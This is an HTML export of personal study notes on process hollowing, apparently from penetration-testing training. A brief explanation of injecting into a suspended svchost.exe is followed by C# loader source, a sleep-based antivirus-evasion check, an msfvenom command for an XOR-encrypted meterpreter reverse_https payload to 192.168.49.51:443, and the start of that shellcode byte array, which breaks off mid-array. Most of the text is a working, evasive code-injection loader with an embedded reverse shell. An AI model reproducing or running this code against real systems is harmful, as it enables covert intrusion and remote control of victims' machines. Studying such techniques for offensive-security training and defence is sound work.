<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>process hollowing</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>process hollowing</h1><br/><p><h2>Process Hollowing</h2><ul><li><small>Previously we have done  code injection into various processes, including explorer.exe and notepad.exe, which is abnormal due to their lack of network activity, making them susceptible to detection.</small></li><li><small>The focus is shifting to </small><strong><small>svchost.exe</small></strong><small>, a</small><strong><small> process with network activity</small></strong><small>. However, injecting code into svchost.exe is challenging because it runs at </small><strong><small>SYSTEM</small></strong><small> integrity level and launching it directly leads to immediate termination.</small></li><li><small>To address this, we will launch a svchost.exe process and modify it before it actually starts executing. This is known as Process Hollowing and should execute our payload without terminating it.</small></li><li><small>locate entry point of exe and halt it </small></li><li><small>idea: create suspended process </small><ul><li><small>suspend an existing process</small></li><li><small>hollow out its original code </small></li><li><small>replace it with our shellcode </small></li><li><small>subsequently execute it</small></li></ul></li></ul></p><p></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> ProcessHollowing<br />{<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">const</span> <span style="color:#7f0044;font-weight:400">uint</span> CREATE_SUSPENDED = <span style="color:#ff0044;font-weight:400">0x4</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">const</span> <span style="color:#7f0044;font-weight:400">int</span> PROCESSBASICINFORMATION = <span style="color:#ff0044;font-weight:400">0</span>;<br /><br />        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">struct</span> ProcessInfo<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hProcess;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hThread;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 ProcessId;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 ThreadId;<br />        }<br /><br />        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">struct</span> StartupInfo<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> cb;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpReserved;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpDesktop;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpTitle;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwX;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwY;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwXSize;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwYSize;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwXCountChars;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwYCountChars;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwFillAttribute;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwFlags;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">short</span> wShowWindow;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">short</span> cbReserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr lpReserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdInput;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdOutput;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdError;<br />        }<br /><br />        [StructLayout(LayoutKind.Sequential)]<br />        <span style="color:#ff9d00;font-weight:700">internal</span> <span style="color:#ff9d00;font-weight:700">struct</span> ProcessBasicInfo<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr Reserved1;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr PebAddress;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr Reserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr Reserved3;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr UniquePid;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr MoreReserved;<br />        }<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#ff9d00;font-weight:700">void</span> Sleep(<span style="color:#7f0044;font-weight:400">uint</span> dwMilliseconds);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, CharSet = CharSet.Ansi)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> CreateProcess(<span style="color:#7f0044;font-weight:400">string</span> lpApplicationName, <span style="color:#7f0044;font-weight:400">string</span> lpCommandLine, IntPtr lpProcessAttributes,<br />            IntPtr lpThreadAttributes, <span style="color:#7f0044;font-weight:400">bool</span> bInheritHandles, <span style="color:#7f0044;font-weight:400">uint</span> dwCreationFlags, IntPtr lpEnvironment, <span style="color:#7f0044;font-weight:400">string</span> lpCurrentDirectory,<br />            [In] <span style="color:#ff9d00;font-weight:700">ref</span> StartupInfo lpStartupInfo, <span style="color:#ff9d00;font-weight:700">out</span> ProcessInfo lpProcessInformation);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;ntdll.dll&quot;</span>, CallingConvention = CallingConvention.StdCall)]<br />        <span style="color:#ff9d00;font-weight:700">private</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">int</span> ZwQueryInformationProcess(IntPtr hProcess, <span style="color:#7f0044;font-weight:400">int</span> procInformationClass,<br />            <span style="color:#ff9d00;font-weight:700">ref</span> ProcessBasicInfo procInformation, <span style="color:#7f0044;font-weight:400">uint</span> ProcInfoLen, <span style="color:#ff9d00;font-weight:700">ref</span> <span style="color:#7f0044;font-weight:400">uint</span> retlen);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] <span style="color:#7f0044;font-weight:400">byte</span>[] lpBuffer,<br />            <span style="color:#7f0044;font-weight:400">int</span> dwSize, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr lpNumberOfbytesRW);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, <span style="color:#7f0044;font-weight:400">byte</span>[] lpBuffer, Int32 nSize, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr lpNumberOfBytesWritten);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">uint</span> ResumeThread(IntPtr hThread);<br /><br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            <span style="color:#0088ff;font-weight:400">// AV evasion: Sleep for 10s and detect if time really passed</span><br />            DateTime t1 = DateTime.Now;<br />            Sleep(<span style="color:#ff0044;font-weight:400">10000</span>);<br />            <span style="color:#7f0044;font-weight:400">double</span> deltaT = DateTime.Now.Subtract(t1).TotalSeconds;<br />            <span style="color:#ff9d00;font-weight:700">if</span> (deltaT &lt; <span style="color:#ff0044;font-weight:400">9.5</span>)<br />            {<br />                <span style="color:#ff9d00;font-weight:700">return</span>;<br />            }<br /><br />            <span style="color:#0088ff;font-weight:400">// sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.51 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a</span><br />           <span style="color:#7f0044;font-weight:400">byte</span>[] buf = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">723</span>] {<span style="color:#ff0044;font-weight:400">0x9d</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe2</span>,<span style="color:#ff0044;font-weight:400">0x85</span>,<span style="color:#ff0044;font-weight:400">0x91</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<br /><span style="color:#ff0044;font-weight:400">0xad</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<br /><span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0x04</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x01</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x79</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<br /><span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x6e</span>,<span style="color:#ff0044;font-weight:400">0xd6</span>,<span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<br /><span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0xcd</span>,<span style="color:#ff0044;font-weight:400">0x5d</span>,<span style="color:#ff0044;font-weight:400">0x00</span>,<span style="color:#ff0044;font-weight:400">0x1d</span>,<span style="color:#ff0044;font-weight:400">0x63</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<br /><span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0xa0</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x6c</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<span style="color:#ff0044;font-weight:400">0xa0</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0x8c</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<br /><span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x23</span>,<span style="color:#ff0044;font-weight:400">0x5d</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<span style="color:#ff0044;font-weight:400">0xb1</span>,<span style="color:#ff0044;font-weight:400">0x07</span>,<span style="color:#ff0044;font-weight:400">0xe0</span>,<span style="color:#ff0044;font-weight:400">0x19</span>,<br /><span style="color:#ff0044;font-weight:400">0x79</span>,<span style="color:#ff0044;font-weight:400">0x6a</span>,<span style="color:#ff0044;font-weight:400">0x63</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<span style="color:#ff0044;font-weight:400">0x6e</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<br /><span style="color:#ff0044;font-weight:400">0xe1</span>,<span style="color:#ff0044;font-weight:400">0xe9</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0x15</span>,<span style="color:#ff0044;font-weight:400">0x06</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<br /><span style="color:#ff0044;font-weight:400">0xb1</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x79</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x25</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x21</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<span style="color:#ff0044;font-weight:400">0xb1</span>,<br /><span style="color:#ff0044;font-weight:400">0x82</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x55</span>,<span style="color:#ff0044;font-weight:400">0xe9</span>,<br /><span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<span style="color:#ff0044;font-weight:400">0xb7</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0xcd</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0xa0</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x6c</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<br /><span style="color:#ff0044;font-weight:400">0x60</span>,<span style="color:#ff0044;font-weight:400">0xa0</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x81</span>,<span style="color:#ff0044;font-weight:400">0x14</span>,<span style="color:#ff0044;font-weight:400">0x90</span>,<span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x62</span>,<span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x45</span>,<span style="color:#ff0044;font-weight:400">0x69</span>,<span style="color:#ff0044;font-weight:400">0x24</span>,<br /><span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0xb0</span>,<span style="color:#ff0044;font-weight:400">0x14</span>,<span style="color:#ff0044;font-weight:400">0xb9</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x25</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x21</span>,<span style="color:#ff0044;font-weight:400">0x45</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<span style="color:#ff0044;font-weight:400">0xb1</span>,<br /><span style="color:#ff0044;font-weight:400">0x07</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x6d</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x25</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x21</span>,<span style="color:#ff0044;font-weight:400">0x7d</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<span style="color:#ff0044;font-weight:400">0xb1</span>,<br /><span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x65</span>,<span style="color:#ff0044;font-weight:400">0xe9</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x3f</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<span style="color:#ff0044;font-weight:400">0xb1</span>,<br /><span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe2</span>,<span style="color:#ff0044;font-weight:400">0x8d</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<br /><span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0x81</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x73</span>,<span style="color:#ff0044;font-weight:400">0x88</span>,<br /><span style="color:#ff0044;font-weight:400">0x2a</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0x3c</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xba</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xdf</span>,<span style="color:#ff0044;font-weight:400">0x16</span>,<br /><span style="color:#ff0044;font-weight:400">0x08</span>,<span style="color:#ff0044;font-weight:400">0x0f</span>,<span style="color:#ff0044;font-weight:400">0x08</span>,<span style="color:#ff0044;font-weight:400">0x0f</span>,<span style="color:#ff0044;font-weight:400">0x04</span>,<span style="color:#ff0044;font-weight:400">0x15</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x80</span>,<br /><span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0xa3</span>,<span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x16</span>,<span style="color:#ff0044;font-weight:400">0x47</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<br /><span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x80</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<br /><span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xdb</span>,<span style="color:#ff0044;font-weight:400">0x5b</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x18</span>,<span style="color:#ff0044;font-weight:400">0xc6</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<br /><span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0x6f</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x4f</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<br /><span style="color:#ff0044;font-weight:400">0x4f</span>,<span style="color:#ff0044;font-weight:400">0x55</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x4f</span>,<span style="color:#ff0044;font-weight:400">0x54</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xa0</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<br /><span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0xda</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x0b</span>,<br /><span style="color:#ff0044;font-weight:400">0x62</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xdb</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xfe</span>,<span style="color:#ff0044;font-weight:400">0xa7</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<br /><span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xc8</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x4e</span>,<span style="color:#ff0044;font-weight:400">0x1b</span>,<span style="color:#ff0044;font-weight:400">0x54</span>,<span style="color:#ff0044;font-weight:400">0x02</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<br /><span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x08</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x0c</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0x26</span>,<span style="color:#ff0044;font-weight:400">0x02</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x08</span>,<br /><span style="color:#ff0044;font-weight:400">0x4c</span>,<span style="color:#ff0044;font-weight:400">0x03</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x1b</span>,<span style="color:#ff0044;font-weight:400">0x35</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x18</span>,<span style="color:#ff0044;font-weight:400">0x10</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x14</span>,<br /><span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x24</span>,<span style="color:#ff0044;font-weight:400">0x0b</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0x11</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x35</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<br /><span style="color:#ff0044;font-weight:400">0x17</span>,<span style="color:#ff0044;font-weight:400">0x1b</span>,<span style="color:#ff0044;font-weight:400">0x23</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x26</span>,<span style="color:#ff0044;font-weight:400">0x08</span>,<span style="color:#ff0044;font-weight:400">0x06</span>,<span style="color:#ff0044;font-weight:400">0x14</span>,<span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<span 